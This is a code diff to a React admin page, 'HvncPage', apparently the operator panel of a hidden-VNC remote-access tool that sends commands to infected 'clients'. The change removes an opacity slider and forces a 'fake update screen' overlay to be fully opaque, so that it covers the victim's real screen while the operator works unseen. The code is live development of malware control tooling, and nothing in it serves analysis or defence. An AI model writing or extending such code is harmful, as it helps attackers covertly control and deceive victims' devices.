@@ -49,7 +49,6 @@ export default function HvncPage() {
   const [codecInfo, setCodecInfo] = useState<string>('');
   const [socketConnected, setSocketConnected] = useState(!!getAdminSocket()?.connected);
   const [fakeScreen, setFakeScreen] = useState(true);
-  const [overlayAlpha, setOverlayAlpha] = useState(1);
   const [overlayVisible, setOverlayVisible] = useState(false);
   const [overlayGranted, setOverlayGranted] = useState<boolean | null>(null);
 
@@ -494,17 +493,10 @@ export default function HvncPage() {
       if (overlayVisible) {
         await clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType: 'overlay_hide' });
       } else {
-        await clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType: 'overlay_show', alpha: overlayAlpha });
+        await clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType: 'overlay_show', alpha: 1 });
       }
     } catch (err: any) {
       setError(err?.response?.data?.error || 'Overlay command failed');
-    }
-  }, [id, overlayVisible, overlayAlpha]);
-
-  const applyAlpha = useCallback(async (a: number) => {
-    setOverlayAlpha(a);
-    if (id && overlayVisible) {
-      await clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType: 'overlay_alpha', alpha: a }).catch(() => {});
     }
   }, [id, overlayVisible]);
 
@@ -697,8 +689,7 @@ export default function HvncPage() {
             <div className="space-y-2 col-span-2 md:col-span-4">
               <div className="flex items-center justify-between gap-3">
                 <Label className="text-xs">
-                  Fake update screen opacity — {Math.round(overlayAlpha * 100)}%
-                  <span className="opacity-60"> (lower = you see the app through it)</span>
+                  Fake screen: opaque, fully covers the real UI
                 </Label>
                 <Button
                   variant={fakeScreen ? 'default' : 'outline'}
@@ -709,17 +700,9 @@ export default function HvncPage() {
                   {fakeScreen ? 'Auto on start' : 'Manual'}
                 </Button>
               </div>
-              <input
-                type="range"
-                min={10}
-                max={100}
-                value={Math.round(overlayAlpha * 100)}
-                onChange={e => applyAlpha(Number(e.target.value) / 100)}
-                className="w-full accent-primary"
-              />
             </div>
           </div>
-          {streaming && <p className="text-xs text-muted-foreground mt-3">Stop the stream to change capture settings. Opacity works live.</p>}
+          {streaming && <p className="text-xs text-muted-foreground mt-3">Stop the stream to change capture settings.</p>}
         </SectionCard>
       )}
 
